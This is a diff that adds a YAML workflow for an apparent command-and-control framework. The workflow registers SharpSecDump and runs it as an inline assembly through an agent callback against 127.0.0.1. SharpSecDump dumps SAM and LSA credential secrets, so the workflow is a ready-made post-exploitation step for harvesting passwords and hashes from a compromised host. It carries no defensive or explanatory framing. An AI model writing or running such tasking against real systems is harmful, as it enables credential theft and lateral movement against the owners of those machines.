@@ -1,0 +1,37 @@
+name: "forge_net_SharpSecDump"
+description: "Register and run SharpSecDump via forge_net"
+trigger: manual
+run_as: self
+
+steps:
+###########################################################
+# SharpSecDump
+###########################################################
+  - name: "register forge_net_SharpSecDump"
+    depends_on: []
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: forge_register
+      payload_type: forge
+      params_dictionary:
+        collectionName: SharpCollection
+        commandName: SharpSecDump
+        remove: false
+
+  - name: "localhost forge_net_SharpSecDump"
+    depends_on:
+      - "register forge_net_SharpSecDump"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: forge_net_SharpSecDump
+      payload_type: forge
+      params_dictionary:
+        args: "-target=127.0.0.1"
+        version: 4.7_Any
+        execution: inline_assembly
